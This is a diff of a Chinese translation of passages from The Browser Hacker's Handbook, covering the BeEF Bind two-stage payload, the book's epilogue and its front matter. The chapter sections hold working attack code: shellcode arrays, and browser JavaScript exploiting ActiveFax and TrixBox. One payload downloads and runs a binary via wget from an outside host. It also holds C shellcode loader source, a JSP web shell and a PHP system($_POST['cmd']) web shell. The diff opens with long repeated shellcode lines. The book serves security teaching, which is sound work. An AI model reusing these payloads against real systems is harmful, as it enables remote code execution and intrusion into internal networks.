-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
-"\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10"+
-"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48"+
-"\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"+
 "\xc0\xac\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10+
 "
+```
 
+### Level1
 
-Level1 **1.** 一个存在漏洞的内部 IMAP 服务器通过被钩钉的浏览器被发现。 **2.** 被钩钉的浏览器利用该漏洞服务发送 XMLHttpRequest。 BeEF Bind Stager 被用作漏洞利用的负载。 **3.** 这在受影响的 IMAP 服务器上打开了 TCP 监听器，监听端口 4444，该服务器现在等待 BeEF Bind 负载的第二部分——Stage。 **4.** 被钩钉的浏览器再次向服务器的 4444 端口发送请求，使用 XMLHttpRequest.sendAsBinary，这次发送 BeEF Bind Stage。 **5.** BeEF Bind 现在已激活，允许通过标准 POST 请求向受影响的 IMAP 服务器提交任意操作系统命令。
+1. 一个存在漏洞的内部 IMAP 服务器通过被钩钉的浏览器被发现。
+2. 被钩钉的浏览器利用该漏洞服务发送 `XMLHttpRequest`。`BeEF Bind Stager` 被用作漏洞利用的负载。
+3. 这在受影响的 IMAP 服务器上打开了 TCP 监听器，监听端口 4444，该服务器现在等待 `BeEF Bind` 负载的第二部分——`Stage`。
+4. 被钩钉的浏览器再次向服务器的 4444 端口发送请求，使用 `XMLHttpRequest.sendAsBinary()`，这次发送 `BeEF Bind Stage`。
+5. `BeEF Bind` 现在已激活，允许通过标准 `POST` 请求向受影响的 IMAP 服务器提交任意操作系统命令。
 
-/Level1
-
-下一个示例再次探讨 ActiveFax，这次使用 BeEF Bind Shellcode。
+下一个示例再次探讨 ActiveFax，这次使用 `BeEF Bind Shellcode`。
 
 ### ActiveFAX Inter-protocol Exploitation Example
 
-使用 BeEF Bind Shellcode 针对 ActiveFax，你需要对前文讨论的 ActiveFax 利用示例中的代码进行修改。你还需要向 Stager 端口发送一个额外请求，这会导致以下修改后的代码。请记住，由于不良字符限制，必须使用 alpha_mixed 编码器。
+使用 `BeEF Bind Shellcode` 针对 ActiveFax，你需要对前文讨论的 ActiveFax 利用示例中的代码进行修改。你还需要向 `Stager` 端口发送一个额外请求，这会导致以下修改后的代码。请记住，由于不良字符限制，必须使用 `alpha_mixed` 编码器。
 
-```
+
+
+```javascript
 // BeEF bind Stage
+
 var stage = "\xfc\xe8\x89[...snip...]";
 
 setTimeout(function(){
+
   xhr.abort();
+
   setTimeout(function(){
+
     // 等待几秒以让 Stager 进入内存，然后
     // 在默认 BeEF Bind 端口 4444 上发送 Stage。
     var stage_request = "cmd=" + stage;
     sendRequest(4444, stage_request);
+
   }, 4000);
+
 }, 2000);
 ```
 
 发送 Stager 和 Stage 之后，你就可以与在受害系统上运行的 BeEF Bind 监听器进行通信。Figure 10-29 展示了通过 BeEF Bind 执行 netstat 命令的过程。
 
- start figure 
+start figure
 
 **Figure 10-29:** 使用 BeEF Bind 与受 compromised 系统交互
 
 ![c10f029.tif](img/c10f029.png)
 
- end figure 
+end figure
 
-为简化过程，我们想使用 BeEF 的 “beef_bind_shell” 命令模块来与 Shellcode 通信。Figure 10-30 的图表提供了此攻击的高层次概览以及它如何基于前文的 IPE 攻击。你可以清楚地看到，双向通信通道完全通过浏览器传递，并且位于被钩钉浏览器的内部网络内部。
+为简化过程，我们想使用 BeEF 的 `beef_bind_shell` 命令模块来与 Shellcode 通信。Figure 10-30 的图表提供了此攻击的高层次概览以及它如何基于前文的 IPE 攻击。你可以清楚地看到，双向通信通道完全通过浏览器传递，并且位于被钩钉浏览器的内部网络内部。
 
- start figure 
+start figure
 
 **Figure 10-30:** ActiveFax 利用 BeEF Bind Shellcode 的高层次概览
 
 ![c10f030.tif](img/c10f030.png)
 
- end figure 
+end figure
 
 使用 BeEF Bind 的主要优势在于消除了对出站通信通道的猜测。你不需要预测出站开放端口，也不必使用 HTTP 或 DNS 隧道突破网络限制。你利用浏览器已经存在的通信通道，这最终提高了利用成功率。
 
@@ -14590,7 +14840,7 @@ TrixBox 默认在 CentOS Linux 上运行，且其 iptables 配置默认不阻止
 
 下面的代码被注入到受害浏览器中，利用之前讨论的相同 TrixBox 漏洞。此次，它会在目标上运行 BeEF Bind Stager 二进制文件：
 
-```
+```javascript
 var uri = "http://172.16.37.155/user/index.php";
 
 /* 要与 PHP exec 执行的命令
@@ -14598,6 +14848,7 @@ var uri = "http://172.16.37.155/user/index.php";
  * 2. 将二进制标记为可执行
  * 3. 在后台运行它
 */
+
 var cmd = btoa("/usr/bin/wget -O /tmp/BeEF_bind " + 
 "http://browserhacker.com/BeEF_bind " + 
 "&& /bin/chmod +x /tmp/BeEF_bind && " + 
@@ -14605,6 +14856,7 @@ var cmd = btoa("/usr/bin/wget -O /tmp/BeEF_bind " +
 
 // POST 主体。前面的命令从 Base64 解码后执行
 var body = "langChoice=<?php exec(base64_decode('" + cmd + "'));?>%00";
+
 var xhr = new XMLHttpRequest();
 xhr.open("POST", uri, true);
 xhr.setRequestHeader("Content-Type", 
@@ -14612,6 +14864,7 @@ xhr.setRequestHeader("Content-Type",
 xhr.setRequestHeader('Accept','*/*');
 xhr.setRequestHeader("Accept-Language", "en");
 xhr.send(body);
+
 console.log("Sending first request with RCE vector...");
 
 function getCookie(name){
@@ -14629,7 +14882,6 @@ function trigger(){
  // 当前会话 cookie
  var phpsessid = getCookie("PHPSESSID");
  console.log("Using PHPSESSID: " + phpsessid);
- 
  // 触发代码执行需要评估 PHP 的 $_SESSION 的序列化内容
  var body = "langChoice=../../../../../../../../../../tmp/sess_"
  + phpsessid + "%00";
@@ -14643,6 +14895,7 @@ function trigger(){
  console.log("Sending second to trigger RCE...\n" + 
  "BeEF Bind ELF should now be listening on port 4444.");
 }
+
 setTimeout(function(){trigger();}, 3000);
 ```
 
@@ -14650,17 +14903,15 @@ setTimeout(function(){trigger();}, 3000);
 
 在此实例中，BeEF Bind 是一个 32 位 Linux ELF 二进制文件，包含前文讨论的 BeEF Bind Stager 功能。你可以使用以下 C 代码编译 Shellcode 为二进制文件，但它也可从 [`browserhacker.com`](https://browserhacker.com) 下载：
 
-```
+```c
 #include <stdio.h>
 #include <sys/mman.h>
 #include <string.h>
 #include <stdlib.h>
-
 # Compile with GCC on Linux as the following
 # gcc -fno-stack-protector -z execstack -o BeEF_bind BeEF_bind.c
 
 int (*sc)();
-
 char shellcode[] = "\xfc\x31\xc0\x31\xd2\x6a\x01\x5b\x50\x40"+
 "\x50\x40\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\xc6\x6a\x0e\x5b"+
 "\x6a\x04\x54\x6a\x02\x6a\x01\x56\x89\xe1\x6a\x66\x58\xcd\x80"+
@@ -14688,18 +14939,15 @@ int main(int argc, char **argv) {
 
 在此阶段，你应该已经拥有正在监听 TCP 端口 4444 的 BeEF Bind Stager，如 Figure 10-31 所示。
 
- start figure 
+start figure
 
-
-
-
--   Figure 10-31: BeEF Bind ELF Stager 运行在 4444 端口上
+- Figure 10-31: BeEF Bind ELF Stager 运行在 4444 端口上
 
 ![c10f031.tif](img/c10f031.png)
 
-end figure 
+end figure
 
-现在，你已准备好发送 Stage 进行执行。你可以使用以下 JavaScript，即使跨源，因为 BeEF Bind 返回 Access-Control-Allow-Origin 头，其值为通配符（是的，在这种情况下是安全的）：
+现在，你已准备好发送 Stage 进行执行。你可以使用以下 JavaScript，即使跨源，因为 BeEF Bind 返回 `Access-Control-Allow-Origin` 头，其值为通配符：
 
 ```javascript
 // BeEF Bind Linux_32bit Stage
@@ -14751,7 +14999,6 @@ var BeEF_Bind_Stage =
 "\x58\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4"+
 "\xcd\x80\x31\xc0\x50\x50\x68\x2f\x2f\x73\x68\x68"+
 "\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80";
-```
 
 var uri = "http://172.16.37.155:4444/"; 
 xhr = new XMLHttpRequest(); 
@@ -14762,15 +15009,17 @@ xhr.setRequestHeader("Accept-Language", "en");
 xhr.sendAsBinary("cmd=" + BeEF_Bind_Stage);
 ```
 
-这段代码向 BeEF Bind 监听器发送跨源 POST 请求，端口为 4444。cmd 参数的值是 Linux Stage，它会被加载到内存中，随后被执行并由初始 Stager 处理。Stage 发送后，你可以通过钩住的浏览器通过跨源方式执行操作系统命令。如图 Figure 10-32 所示，得益于 BeEF Bind CORS 头，你可以跨源获取命令执行结果。
+这段代码向 BeEF Bind 监听器发送跨源 POST 请求，端口为 4444。`cmd` 参数的值是 Linux Stage，它会被加载到内存中，随后被执行并由初始 Stager 处理。Stage 发送后，你可以通过钩住的浏览器通过跨源方式执行操作系统命令。如图 Figure 10-32 所示，得益于 BeEF Bind CORS 头，你可以跨源获取命令执行结果。
 
- start figure 
+start figure
+
+
 
 **Figure 10-32:** 向 BeEF Bind 发送 netstat 命令
 
 ![c10f032.tif](img/c10f032.png)
 
- end figure 
+end figure
 
 在此实例中，你使用了针对 Linux 系统的 BeEF Bind 代码作为预编译二进制。这段示例突出了 BeEF Bind 代码作为建立双向通信的手段，以向已被入侵的内部服务建立通信的强大性。
 
@@ -14784,10 +15033,8 @@ xhr.sendAsBinary("cmd=" + BeEF_Bind_Stage);
 
 以下是 BeEF Bind 必须移植的三个主要特性，以使钩住的浏览器能够与 Web Shell 进行通信：
 
-*   每个 HTTP 响应必须包含 Allow-Access-From-Origin: \*，以允许与钩住的浏览器进行双向跨源通信。
-
-*   页面必须接受 POST 请求（Content-Type 为 text/plain 或 application/x-www-form-urlencoded），并包含 cmd 参数，该参数保存将要执行的命令。
-
+*   每个 HTTP 响应必须包含 `Allow-Access-From-Origin: *`，以允许与钩住的浏览器进行双向跨源通信。
+*   页面必须接受 POST 请求（Content-Type 为 `text/plain` 或 `application/x-www-form-urlencoded`），并包含 `cmd` 参数，该参数保存将要执行的命令。
 *   执行的命令输出必须在 HTTP 响应中返回。
 
 以下 JSP 满足上述所有要求，可用于第 9 章讨论的利用场景：
@@ -14824,7 +15071,7 @@ out.println("Exception!!");
 %>
 ```
 
-假设前面的 JSP 文件已成功部署到脆弱的 JBoss 6.0.0.M1 服务器上（与第 9 章讨论的利用方式相同），并名为 BeEF_Bind.jsp。由于每个 HTTP 响应都返回 Access-Control-Allow-Origin: \*，你可以跨源与这个新 JSP 页面进行交互。此外，JSP 会正确解析 text/plain POST 请求，并从 cmd 参数中执行命令。
+假设前面的 JSP 文件已成功部署到脆弱的 JBoss 6.0.0.M1 服务器上（与第 9 章讨论的利用方式相同），并名为 `BeEF_Bind.jsp`。由于每个 HTTP 响应都返回 `Access-Control-Allow-Origin: *`，你可以跨源与这个新 JSP 页面进行交互。此外，JSP 会正确解析 `text/plain` POST 请求，并从 `cmd` 参数中执行命令。
 
 下面是用于在钩住的浏览器中跨源与新建的 JSP BeEF Bind Web Shell 进行通信的 JavaScript 代码，与本章之前展示的跨源通信代码非常相似：
 
@@ -14844,24 +15091,23 @@ xhr.setRequestHeader("Content-Type", "text/plain");
 xhr.setRequestHeader('Accept','*/*');
 xhr.setRequestHeader("Accept-Language", "en");
 xhr.send("cmd=" + cmd);
-
-
+```
 
 -   如图 10-33 所示，POST 请求是跨源发送的，命令结果会在 HTTP 响应中返回到被钩针的浏览器。从 `/etc/passwd` 中的注释可以看出，JBoss 正运行在 OS X 上。
 
-start figure 
+start figure
 
 **Figure 10-33:** 命令的输出打印到 JS 控制台
 
 ![c10f033.tif](img/c10f033.png)
 
-end figure 
+end figure
 
 本文实现的方法可以在其他服务器端语言中实现。只要你能控制 HTTP 响应中的 CORS 头并且能执行系统命令，这种技术依然有效。
 
 在 PHP 中实现相同逻辑仅需两行：
 
-``` 
+```
 <?php header("Access-Control-Allow-Origin: *"); 
  echo @system($_POST['cmd']); 
 ?>
@@ -14889,6 +15135,8 @@ Gecko/20100101 Firefox/22.0"
 (Macintosh; Intel Mac OS X 10.8; rv:22.0) 
 Gecko/20100101 Firefox/22.0"
 ```
+
+
 
 BeEF Bind 旨在成为轻量、平台无关的负载。它利用应用漏洞暴露后端通信通道以便进一步攻击。其两阶段架构意味着初始 Stager 可以在空间受限的情况下插入，从而让更大的 Stage 稍后出现。
 
@@ -14941,9 +15189,6 @@ For answers to the questions, please refer to the book’s website [`browserhack
 12\. Sandro Gauci. (2008). The Extended HTML Form Attack revisited. Retrieved October 29, 2013 from [`resources.enablesecurity.com/resources/the%20extended%20html%20form%20attack%20revisited.pdf`](https://resources.enablesecurity.com/resources/the%20extended%20html%20form%20attack%20revisited.pdf)
 
 13\. The Chromium Authors. (2012). net_util.cc. Retrieved October 29, 2013 from [`src.chromium.org/svn/trunk/src/net/base/net_util.cc`](http://src.chromium.org/svn/trunk/src/net/base/net_util.cc)
-
-
-
 
 14. Mozilla. (2008). `nsIOService.cpp`. 2008 年，Mozilla。从[`http://lxr.mozilla.org/seamonkey/source/netwerk/base/src/nsIOService.cpp#87`](http://lxr.mozilla.org/seamonkey/source/netwerk/base/src/nsIOService.cpp#87)检索，10 月 29 日，2013 年。
 
@@ -15013,12 +15258,9 @@ For answers to the questions, please refer to the book’s website [`browserhack
 
 47. Stephen Fewer. (2009). `Block Bind TCP shellcode`. 2009 年，Stephen Fewer。从[`https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_bind_tcp.asm`](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_bind_tcp.asm)检索，10 月 29 日，2013 年。
 
-# *Chapter 11*
+# Chapter 11
 
-# *Epilogue: Final Thoughts*
-
-
-
+# Epilogue: Final Thoughts
 
 The very fact that you have chosen to read a handbook on browser hacking suggests that you, like the authors, see the aggressive adoption of the browser all around you. Browsers are on phones, in cars, on ships, on planes, and even on the International Space Station! You could say the humble browser — along with HTML, JavaScript, and the DOM — has left the confines of our planet, taking its security implications with it.
 
@@ -15046,7 +15288,7 @@ For the foreseeable future, in any developed urban area there will likely be mor
 
 **Endnote**
 
-1\. [`www.ranum.com/security/computer_security/editorials/dumb/`](http://www.ranum.com/security/computer_security/editorials/dumb/)
+1\. [`www.ranum.com/security/computer_security/editorials/dumb/`](http://ranum.com/security/computer_security/editorials/dumb/)
 
 The Browser Hacker’s Handbook
 
@@ -15079,8 +15321,6 @@ For general information on our other products and services please contact our Cu
 Wiley publishes in a variety of print and electronic formats and by print-on-demand. Some material included with standard print versions of this book may not be included in e-books or in print-on-demand. If this book refers to media such as a CD or DVD that is not included in the version you purchased, you may download this material at [`booksupport.wiley.com`](http://booksupport.wiley.com). For more information about Wiley products, visit [www.wiley.com](http://www.wiley.com).
 
 Library of Congress Control Number: 2013958295
-
-
 
 Trademarks: `Wiley` and the `Wiley` logo are trademarks or registered trademarks of `John Wiley & Sons, Inc.` and/or its affiliates, in the United States and other countries, and may not be used without written permission. All other trademarks are the property of their respective owners. `John Wiley & Sons, Inc.` is not associated with any product or vendor mentioned in this book.
 
@@ -15186,8 +15426,6 @@ Trademarks: `Wiley` and the `Wiley` logo are trademarks or registered trademarks
 
 — `Wade Alcorn`
 
-
-
 我第一次在银行系统被破坏时认识了她，如果没有她无限的耐心，我不可能帮忙写这本书。对我亲爱的妻子 Tenille，我衷心感谢你，对我正在你体内成长的女儿——这本书是献给你的（确保你练习负责任的黑客小子）。我也必须感谢我的家人，向我的母亲 Julia 和父亲 Maurice 致谢，他们为我提供了所有让我能够参与这个令人惊叹的信息安全行业的机会。向我的姐妹 Hélène、Justine 和 Amy 致谢，你们是激励人心的，你们的支持非常受 appreciated。向我的 Asterisk Info Sec 家庭致谢，感谢你们让我抱怨这有多么艰难，并给了我有时间为这本书做贡献的机会，谢谢大卫·泰勒、斯蒂夫·舒普、科尔·伯格森、格雷格·罗伯茨和杰罗德·本内斯。我也必须感谢所有澳大利亚和新西兰黑客安全社区的成员，所有我在互联网和会议上认识的朋友，我很高兴能和你们一起成为这个社区的一员，继续加油。当然，我也要感谢 Wade 和 Michele，感谢你们邀请我参与这项巨大的任务，感谢你们的耐心，感谢你们教会我的一切，以及容忍我的蠢事！
 
 — Christian Frichot
@@ -15233,9 +15471,6 @@ Wiley 的好人们以及这本书的技术编辑也应得到非常大的感谢�
 每章结束时都有一组供你思考的问题。这些问题将为你提供一个机会，巩固对章节核心概念的理解。
 
 ## 第 1 章：Web Browser Security
-
-
-
 
 # 本章将带你踏上浏览器黑客之旅的起点。你的第一步是探索重要的浏览器概念以及一些浏览器安全的核心问题。你将探索当今组织防御所需的微型边界范式，并思考那些继续传播不安全实践的谬误。
 
@@ -15308,9 +15543,6 @@ Web 开发者几乎在每个转折点都会被 SOP“敲打”；SOP 在浏览�
 本章中，你还将发现利用浏览器直接与非 Web 服务进行通信的攻击。你将学习如何利用协议漏洞（Inter-protocol Exploitation）技术来 compromise 目标在浏览器内网的系统。
 
 # 网络上的内容
-
-
-
 
 该书的配套网站位于[`https://browserhacker.com`](https://browserhacker.com%20)或维基网站[`www.wiley.com/go/browserhackershandbook`](http://www.wiley.com/go/browserhackershandbook)。在这些网站上，您可以找到与本书内容相辅相成的信息。它不是替代，但细节将补充您从章节中获得的知识。
 
